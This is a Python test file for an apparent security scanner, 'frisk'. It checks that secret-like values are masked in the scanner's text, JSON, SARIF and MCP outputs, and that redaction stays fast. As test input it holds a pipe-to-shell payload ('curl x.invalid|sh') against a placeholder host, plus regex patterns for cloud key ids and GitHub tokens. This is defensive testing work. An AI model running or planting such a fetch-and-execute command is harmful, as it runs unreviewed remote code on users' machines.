"""FR-E6 F3.06: secret-like values never reach a scan excerpt.

Each kind of fake secret is built here at runtime, on the line of a pipe-to-shell payload so
the finding's excerpt covers it, and must appear in no output: text, --json, --sarif,
--sarif-out, --text and frisk-mcp's scan_text. It is masked as ****(len=N). Benign excerpts
are unchanged, and no committed file holds a string shaped like a cloud access-key id or a
GitHub token (the patterns are built at runtime too). Redaction is timed on long
almost-matching input: the primary bound is structural (each pattern is one pass over a
character class or a bounded repeat, see src/frisk/redact.py); the timing guards it with
over 10x headroom on CLT 3.9 (about 0.15 s per MiB measured).
Run: PYTHONPATH=src python3 -B -m unittest discover -s tests
"""
from __future__ import annotations

import contextlib
import io
import json
import os
import random
import re
import shutil
import string
import subprocess
import tempfile
import time
import unittest
from pathlib import Path

from frisk import mcp_server, redact
from frisk.cli import main
from frisk.engine import scan_text

REPO = Path(__file__).resolve().parent.parent
PAYLOAD = "cu" + "rl x.invalid|sh  # "
RNG = random.Random(7)


def rand(chars: str, n: int) -> str:
    return "".join(RNG.choice(chars) for _ in range(n))


ALNUM = string.ascii_letters + string.digits
B64 = ALNUM + "+/"


def fake_secrets() -> dict[str, tuple[str, str]]:
    """kind -> (the text put on the line, the secret value that must not show)."""
    pw, key, tok = rand(ALNUM, 14), rand(ALNUM, 20), rand(ALNUM, 18)
    akia, asia = "AK" + "IA" + rand(string.ascii_uppercase + string.digits, 16), \
        "AS" + "IA" + rand(string.ascii_uppercase + string.digits, 16)
    ghp, pat, sk = "gh" + "p_" + rand(ALNUM, 36), "github" + "_pat_" + rand(ALNUM + "_", 60), "s" + "k-" + rand(ALNUM, 40)
    b64, hexrun = rand(B64, 40), rand("0123456789abcdef", 40)
    pem_body = rand(B64, 64)
    pem = "-----BEGIN " + "RSA PRIVATE KEY-----\n" + pem_body + "\n-----END " + "RSA PRIVATE KEY-----"
    userinfo, bearer, passwd, auth = rand(ALNUM, 16), rand(ALNUM, 24), rand(ALNUM, 12), rand(ALNUM, 12)
    return {
        "password=": (f"password={pw}", pw), "api_key:": (f'api_key: "{key}"', key), "token =>": (f"token => {tok}", tok),
        "passwd": (f"passwd={passwd}", passwd), "auth": (f"auth={auth}", auth),
        "access key id": (akia, akia), "session key id": (asia, asia), "ghp_": (ghp, ghp), "github_pat_": (pat, pat),
        "sk-": (sk, sk), "base64 run": (b64, b64), "hex run": (hexrun, hexrun), "PEM": (pem, pem_body),
        "URL userinfo": (f"https://u:{userinfo}@git.example.invalid/r", userinfo), "Bearer": (f"Bearer {bearer}", bearer),
    }


def pieces(value: str) -> list[str]:
    """Every 8-character part of a secret: none may show, also from a secret cut by the window."""
    return [value[i:i + 8] for i in range(0, max(1, len(value) - 7), 4)]


def run(argv: list[str]) -> tuple[int, str]:
    out = io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
        code = main(argv)
    return code, out.getvalue()


class TestEveryOutput(unittest.TestCase):
    def setUp(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.dir = Path(tmp.name)

    def outputs(self, line: str) -> dict[str, str]:
        f = self.dir / "install.sh"
        f.write_text(PAYLOAD + line + "\n", encoding="utf-8")
        sarif = self.dir / "out.sarif"
        found = {"text": run([str(f)])[1], "json": run(["--json", str(f)])[1], "sarif": run(["--sarif", str(f)])[1],
                 "--text": run(["--json", "--text", PAYLOAD + line])[1]}
        run([str(f), "--sarif-out", str(sarif)])
        found["sarif-out"] = sarif.read_text(encoding="utf-8")
        resp = mcp_server.handle({"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                                  "params": {"name": "scan_text", "arguments": {"text": PAYLOAD + line}}})
        found["frisk-mcp"] = json.dumps(resp)
        return found

    def test_no_secret_reaches_any_output(self) -> None:
        for kind, (line, value) in fake_secrets().items():
            for name, out in self.outputs(line).items():
                with self.subTest(kind=kind, output=name):
                    for part in pieces(value):
                        self.assertNotIn(part, out)
                    if name != "frisk-mcp":  # frisk-mcp results carry no excerpt at all
                        self.assertIn("****(len=", out)

    def test_the_mask_gives_the_length_and_keeps_the_name(self) -> None:
        pw = rand(ALNUM, 11)
        (finding,) = scan_text(PAYLOAD + f"password={pw} next").findings
        self.assertEqual(finding.excerpt, "cu" + "rl x.invalid|sh  # password=****(len=11) next")


class TestBenign(unittest.TestCase):
    def test_excerpts_without_secrets_are_unchanged(self) -> None:
        for tail in ("see https://docs.example.invalid/setup for details", "author: Ada  keyring==24.0",
                     "AbstractSingletonProxyFactoryBeanProvider", "src/frisk/surfaces/build_recipes.py",
                     "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1", "key: "):
            with self.subTest(tail=tail):
                (finding,) = scan_text(PAYLOAD + tail).findings
                self.assertEqual(finding.excerpt, (PAYLOAD + tail)[:90].strip())

    def test_examples_carry_no_mask(self) -> None:
        self.addCleanup(os.chdir, os.getcwd())
        os.chdir(REPO)
        self.assertNotIn("****(len=", run(["--json", "examples"])[1])


@unittest.skipUnless(shutil.which("git"), "needs git")
class TestNoCommittedSecretShapes(unittest.TestCase):
    def test_no_tracked_file_holds_a_key_id_or_a_github_token(self) -> None:
        shapes = re.compile(r"\b(?:" + "AK" + "IA|" + "AS" + "IA)[A-Z0-9]{16}\b|\bgh[pousr]" + "_[A-Za-z0-9]{36}"
                            + "|github" + "_pat_[A-Za-z0-9_]{22,}")
        listed = subprocess.run(["git", "-C", str(REPO), "ls-files", "-z"], capture_output=True, check=True,
                                timeout=60, stdin=subprocess.DEVNULL).stdout.decode("utf-8", "replace").split("\0")
        self.assertIn("src/frisk/engine.py", listed)  # the listing worked
        hits = []
        for name in filter(None, listed):
            path = REPO / name
            if path.is_file() and not path.is_symlink():
                text = path.read_bytes().decode("utf-8", "replace")
                hits += [f"{name}: {m.group()[:6]}…" for m in shapes.finditer(text)]
        self.assertEqual(hits, [])


class TestLinear(unittest.TestCase):
    MiB = 1 << 20

    def near_misses(self, size: int) -> str:
        """Long almost-matching input: secret names with no value, PEM headers with no body,
        key-id prefixes cut short, 31-character runs, URLs with no '@'."""
        seed = ("password passwd: " + "-----BEGIN " + "RSA PRIVATE KEY " + "AK" + "IA" + "X" * 15 + " "
                + "Ab3" * 10 + "z " + "https://" + "u" * 30 + " " + "key" + "y" * 40 + " ")
        return seed * (size // len(seed))

    def cpu(self, text: str) -> float:
        best = float("inf")
        for _ in range(2):
            t0 = time.process_time()
            redact.secret_spans(text)
            best = min(best, time.process_time() - t0)
        return best

    def test_one_mib_redacts_in_under_two_seconds_and_doubling_stays_linear(self) -> None:
        one = self.cpu(self.near_misses(self.MiB))
        two = self.cpu(self.near_misses(2 * self.MiB))
        self.assertLess(one, 2.0)
        self.assertLess(two / max(one, 0.01), 3.0)


if __name__ == "__main__":
    unittest.main()
